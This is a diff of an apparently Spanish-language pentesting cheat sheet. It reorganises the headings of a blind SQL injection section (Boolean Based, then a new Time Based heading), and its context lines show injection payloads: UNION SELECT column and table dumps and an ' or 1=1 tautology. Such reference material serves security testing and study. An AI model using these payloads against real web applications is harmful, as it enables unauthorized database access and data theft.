@@ -73,7 +73,9 @@ UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombr
 ```
 ' or 1=1 - --
 ```
-### Blind SQLI - Boolean Based (poner siempre por defecto 'false')
+### Blind SQLI
+
+#### Boolean Based (poner siempre por defecto 'false')
 
 Database enumeration brute force attack(sin sustituir ninguno de los numeros)
 ```
@@ -95,6 +97,7 @@ Table dumping
 ```
 UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_columna like '%'; - --
 ```
+#### Time Based
 
 # Powershell
 
